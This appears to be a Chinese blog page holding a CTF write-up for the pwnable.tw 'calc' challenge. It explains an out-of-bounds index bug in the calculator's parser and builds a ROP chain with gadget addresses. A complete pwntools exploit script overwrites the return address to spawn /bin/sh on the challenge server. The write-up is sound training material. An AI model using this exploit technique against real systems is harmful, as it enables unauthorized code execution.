@@ -1,0 +1,562 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>pwnable.tw calc wp | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="这个题目对我来说还是蛮有价值的… 0x01checksec12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  且为静态编译 ida 整个流程也就是：  对输入进行过滤，最终得到的字符串存入input中 将">
+<meta name="keywords" content="pwn,wp,tw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw calc wp">
+<meta property="og:url" content="p1Kk.github.io/2021/02/07/tw/tw calc/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="这个题目对我来说还是蛮有价值的… 0x01checksec12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  且为静态编译 ida 整个流程也就是：  对输入进行过滤，最终得到的字符串存入input中 将">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/calc.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/get_expr.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/parse_expt.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/init_pool.png">
+<meta property="og:updated_time" content="2021-02-08T03:54:35.563Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.tw calc wp">
+<meta name="twitter:description" content="这个题目对我来说还是蛮有价值的… 0x01checksec12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  且为静态编译 ida 整个流程也就是：  对输入进行过滤，最终得到的字符串存入input中 将">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/calc.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	
+	  <article itemprop="articleBody"> 
+		  <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2021/02/07/tw/tw calc/" title="pwnable.tw calc wp" itemprop="url">pwnable.tw calc wp</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2021-02-06T16:00:00.000Z" itemprop="datePublished"> Published 2021-02-07</time>
+    
+  </p>
+</header>
+	  <div class="article-content">
+		  
+		  <div id="toc" class="toc-article">
+			  <strong class="toc-title">Contents</strong>
+		  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text">0x01</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec"><span class="toc-number">1.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida"><span class="toc-number">1.2.</span> <span class="toc-text">ida</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-分析"><span class="toc-number">2.</span> <span class="toc-text">0x02 分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-exp"><span class="toc-number">3.</span> <span class="toc-text">0x03 exp</span></a></li></ol>
+		  
+		  </div>
+		  
+		  <p>这个题目对我来说还是蛮有价值的…</p>
+<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>且为<strong>静态编译</strong></p>
+<h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/calc.png" alt="calc"><br><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/get_expr.png" alt="get_expr"><br><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/parse_expt.png" alt="parse_expt"></p>
+<p>整个流程也就是：</p>
+<ol>
+<li>对输入进行过滤，最终得到的字符串存入input中</li>
+<li>将input进行解析<ul>
+<li>先查找运算符</li>
+<li>将遇到的数字保存到pool中，pool[0]为当前遍历到的数字数量，通过pool[0]来索引存放位置</li>
+<li>判断存入operator中的运算符优先级，在eval()中进行运算操作</li>
+</ul>
+</li>
+<li>利用运算符和pool中最后两个数字进行运算，将结果保存在pool[-2]，同时–pool[0]</li>
+</ol>
+<h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><p>综上，如果第一个字符就是运算符，如<code>+10</code></p>
+<p>①第一次运算 ，此时 pool[0] = 1, pool[1] = 10，按照上面的逻辑，就会运算 1+10 = 11，并将结果11存放在pool[0]中，pool[0]再自减，就是pool[0]=10。输出给用户的就是pool[10]。</p>
+<p>如果输入的是<code>+10+1</code></p>
+<p>先同上①，再②第二次运算，此时 pool[0] = 11, 【根据pool[0]得到下一位为】pool[11] = 1，运算结果存放在pool[10] = pool[11] + pool[10] = pool[10] + 1</p>
+<p>说明可以得到可控 n 的pool[n]——可以泄露出pool[n]，也可以篡改pool[n]处的值。</p>
+<p>但是还需要注意一点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/init_pool.png" alt></p>
+<p>返回地址距离*pool为(0x5A0+4)/4 = 0x169 = 361</p>
+<p>由于是静态编译，我们考虑在ret后构造ROP：int 80h调用execve(“/bin/sh”)，所以我们需要构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">eax = 11</span><br><span class="line">ebx = addr(&quot;/bin/sh&quot;)</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br><span class="line">即：</span><br><span class="line">+-----------------------------+</span><br><span class="line">|     addr(pop eax; ret)      | --ret--&gt; pool[361]</span><br><span class="line">+-----------------------------+</span><br><span class="line">|              11             | -------&gt; pool[362]</span><br><span class="line">+-----------------------------+</span><br><span class="line">|      addr(pop edx; ret)     |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|              0              |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| addr(pop ecx; pop ebx; ret) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|              0              |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|       addr(&quot;/bin/sh&quot;)       |——————+</span><br><span class="line">+-----------------------------+      |  </span><br><span class="line">|        addr(int 80h)        |      |    </span><br><span class="line">+-----------------------------+      |</span><br><span class="line">|            &quot;/bin&quot;           |&lt;—————+  pool[369]</span><br><span class="line">+-----------------------------+     </span><br><span class="line">|          &quot;/sh\x00&quot;          |       </span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>查找可用链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./calc --only  &quot;pop|ret&quot;</span><br><span class="line">0x0805c34b : pop eax ; ret</span><br><span class="line">0x080701aa : pop edx ; ret</span><br><span class="line">0x080701d1 : pop ecx ; pop ebx ; ret</span><br><span class="line">$ ROPgadget --binary ./calc --only  &quot;int&quot;</span><br><span class="line">0x08049a21 : int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>得到我们写入栈中的/bin/sh地址还需要知道当前栈基址，pool[361]为ret，pool[360]为old ebp即main的ebp，就可以得到main的基址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08049452                 push    ebp</span><br><span class="line">.text:08049453                 mov     ebp, esp</span><br><span class="line">.text:08049455                 and     esp, 0FFFFFFF0h	🔺</span><br><span class="line">.text:08049458                 sub     esp, 10h</span><br></pre></td></tr></table></figure>
+
+<p><code>oldEbp&amp;0FFFFFFF0h-0x10</code>就是ret地址。</p>
+<p>还需要注意一点，我们输入+360后，返回的地址为负数，所以我们计算的时候先转换成正数，再转换回来。</p>
+<hr>
+<p>还有一种快捷解法就是利用ropchain，直接布置到栈上就可以</p>
+<h1 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = &apos;&apos;</span><br><span class="line"></span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;/bin&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;//sh&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebx</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80</span><br><span class="line"></span><br><span class="line">binary = &quot;./calc&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10100</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">	global io</span><br><span class="line">	if debug == 1:</span><br><span class="line">		io = process(binary)</span><br><span class="line">		libc = elf.libc</span><br><span class="line">		# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)	</span><br><span class="line">	else:</span><br><span class="line">		io = remote(ip, port)</span><br><span class="line">		libc = 0</span><br><span class="line">	io.recv()</span><br><span class="line">	for i in range(len(p)/4):</span><br><span class="line">		io.sendline(&apos;+&apos; + str(361+i))</span><br><span class="line">		recv = int(io.recv())</span><br><span class="line">		print &quot;+&quot;+str(361+i)+&quot; = &quot;+hex(recv)</span><br><span class="line">		content = u32(p[i*4:i*4+4])</span><br><span class="line">		print&quot;content = &quot;+hex(content)</span><br><span class="line">		if content &lt; recv:</span><br><span class="line">			recv = recv - content</span><br><span class="line">			io.sendline(&apos;+&apos; + str(361+i) + &apos;-&apos; + str(recv))</span><br><span class="line">		else:</span><br><span class="line">			recv = content-recv</span><br><span class="line">			io.sendline(&apos;+&apos; + str(361+i) + &apos;+&apos; + str(recv))    </span><br><span class="line">		print &quot;final = &quot;+hex(int(io.recv()))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	pwn(ip, port, 0)</span><br></pre></td></tr></table></figure>
+
+  
+	  </div>
+		  <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/oj/">oj</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/wp/">wp</a><a href="/tags/tw/">tw</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	  </article>
+	  
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2021/02/08/tw/tw starbound/" title="pwnable.tw starbound wp">
+  <span>
+  pwnable.tw starbound wp</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2020/12/20/iot/Netgear R8300/"  title="Netgear R8300 PSV-2020-0211栈溢出复现">
+ <span>Netgear R8300 PSV-2020-0211栈溢出复现
+</span>
+</a>
+</div>
+
+</nav>
+
+	  
+
+</div> 
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>20</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞复现/" title="漏洞复现">漏洞复现<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>23</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>38</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>24</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tw/" title="tw">tw<sup>16</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/iot/" title="iot">iot<sup>15</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>11</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/路由器/" title="路由器">路由器<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈溢出/" title="栈溢出">栈溢出<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆/" title="堆">堆<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cve/" title="cve">cve<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/环境搭建/" title="环境搭建">环境搭建<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈/" title="栈">栈<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/命令注入/" title="命令注入">命令注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/命令执行/" title="命令执行">命令执行<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/认证绕过/" title="认证绕过">认证绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/摄像头/" title="摄像头">摄像头<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/待完善/" title="待完善">待完善<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://whali3n51.github.io" target="_blank" title="whali3n51">whali3n51</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+
+	<p class="copyright">
+	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2024 
+	
+	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+	
+	
+	</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
